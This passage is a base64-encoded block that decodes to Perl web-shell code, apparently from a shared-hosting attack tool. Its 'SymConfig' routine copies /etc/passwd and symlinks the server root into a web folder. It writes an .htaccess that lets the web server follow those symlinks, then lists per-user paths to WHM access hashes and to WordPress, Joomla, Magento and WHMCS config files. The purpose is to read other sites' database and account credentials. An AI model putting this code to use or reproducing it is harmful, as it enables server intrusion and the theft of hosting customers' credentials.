RvZXNuJ3QgZXhpc3QNCnsNCiZQcmludFBhZ2VIZWFkZXIoImYiKTsNCnByaW50ICI8Y29kZT5GYWlsZWQgdG8gZG93bmxvYWQgJEZpbGVVcmw6ICQhPC9jb2RlPiI7DQomUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KJlByaW50UGFnZUZvb3RlcjsNCn0NCn0NCnN1YiBTeW1Db25maWcNCnsNCiMhL3Vzci9iaW4vcGVybCAtSS91c3IvbG9jYWwvYmFuZG1pbg0KdXNlIEZpbGU6OkNvcHk7IHVzZSBzdHJpY3Q7IHVzZSB3YXJuaW5nczsgdXNlIE1JTUU6OkJhc2U2NDsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCmlmICghLWUgJGZpbGVuYW1lKSB7IGNvcHkoIi9ldGMvcGFzc3dkIiwicGFzc3dkLnR4dCIpIDsNCn0NCm1rZGlyICJzeW1saW5rX2NvbmZpZyI7DQpzeW1saW5rKCIvIiwic3ltbGlua19jb25maWcvcm9vdCIpOw0KbXkgJGh0YWNjZXNzID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtRV1JrVkhsd1pTQjBaWGgwTDNCc1lXbHVJQzV3YUhBZ0RRcEJaR1JJWVc1a2JHVnlJSFJsZUhRdmNHeGhhVzRnTG5Cb2NBMEtVMkYwYVhObWVTQkJibmtOQ2tsdVpHVjRUM0IwYVc5dWN5QXJRMmhoY25ObGREMVZWRVl0T0NBclJtRnVZM2xKYm1SbGVHbHVaeUFyU1dkdWIzSmxRMkZ6WlNBclJtOXNaR1Z5YzBacGNuTjBJQ3RZU0ZSTlRDQXJTRlJOVEZSaFlteGxJQ3RUZFhCd2NtVnpjMUoxYkdWeklDdFRkWEJ3Y21WemMwUmxjMk55YVhCMGFXOXVJQ3RPWVcxbFYybGtkR2c5S2lBTkNrbHVaR1Y0U1dkdWIzSmxJQ291ZEhoME5EQTBEUXBTWlhkeWFYUmxSVzVuYVc1bElFOXVEUXBTWlhkeWFYUmxRMjl1WkNBbGUxSkZVVlZGVTFSZlJrbE1SVTVCVFVWOUlGNHVLbk41Yld4cGJtdGZZMjl1Wm1sbklGdE9RMTBOQ2xKbGQzSnBkR1ZTZFd4bElGd3VkSGgwSkNBbGUxSkZVVlZGVTFSZlZWSkpmVFF3TkNCYlRDeFNQVE13TWk1T1ExMD0iKTsNCm15ICR4c3ltNDA0ID0gZGVjb2RlX2Jhc2U2NCgiVDNCMGFXOXVjeUJKYm1SbGVHVnpJRVp2Ykd4dmQxTjViVXhwYm10ekRRcEVhWEpsWTNSdmNubEpibVJsZUNCamIyNDNaWGgwTG1oMGJRMEtTR1ZoWkdWeVRtRnRaU0J3Y0hFdWRIaDBEUXBUWVhScGMyWjVJRUZ1ZVEwS1NXNWtaWGhQY0hScGIyNXpJRWxuYm05eVpVTmhjMlVnUm1GdVkzbEpibVJsZUdsdVp5QkdiMnhrWlhKelJtbHljM1FnVG1GdFpWZHBaSFJvUFNvZ1JHVnpZM0pwY0hScGIyNVhhV1IwYUQwcUlGTjFjSEJ5WlhOelNGUk5URkJ5WldGdFlteGxEUXBKYm1SbGVFbG5ibTl5WlNBcSIpOw0Kb3BlbihteSAkZmgxLCAnPicsICdzeW1saW5rX2NvbmZpZy8uaHRhY2Nlc3MnKTsgcHJpbnQgJGZoMSAiJGh0YWNjZXNzIjsgY2xvc2UgJGZoMTsgb3BlbihteSAkeHgsICc+JywgJ3N5bWxpbmtfY29uZmlnL25lbXUudHh0Jyk7IHByaW50ICR4eCAiJHhzeW00MDQiOyBjbG9zZSAkeHg7IG9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOyB3aGlsZSAobXkgJHJvdyA9IDwkZmg+KSB7IG15IEBtYXRjaGVzID0gJHJvdyA9fiAvKC4qPyk6eDovZzsgbXkgJHVzZXJueWEgPSAkMTsgbXkgQGFycmF5ID0gKCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvLmFjY2Vzc2hhc2gnLCB0eXBlID0+ICdXSE0tYWNjZXNzaGFzaCcgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsIHR5cGUgPT4gJ0xva29tZWRpYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywgdHlwZSA9PiAnQmFsaXRiYW5nJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsIHR5cGUgPT4gJ09wZW5DYXJ0JyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19